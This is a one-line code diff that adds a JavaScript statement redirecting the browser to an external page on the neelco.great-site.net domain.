@@ -1,0 +1,1 @@
+window.location.href = 'https://neelco.great-site.net/web1/home.html';
